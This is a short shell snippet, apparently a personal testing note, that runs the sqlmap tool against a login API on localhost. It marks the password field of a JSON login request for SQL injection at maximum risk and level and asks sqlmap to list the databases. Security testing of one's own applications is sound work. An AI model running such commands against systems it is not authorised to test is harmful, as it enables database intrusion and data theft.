cd ../sqlmap-dev

python sqlmap.py -u "http://localhost:4000/api/auth/login" --method POST --data='{"user":{"email":"admin@gmail
.com", "password": "*"}}' --headers="Content-Type: application/json" --risk=3 --level=5 --dbs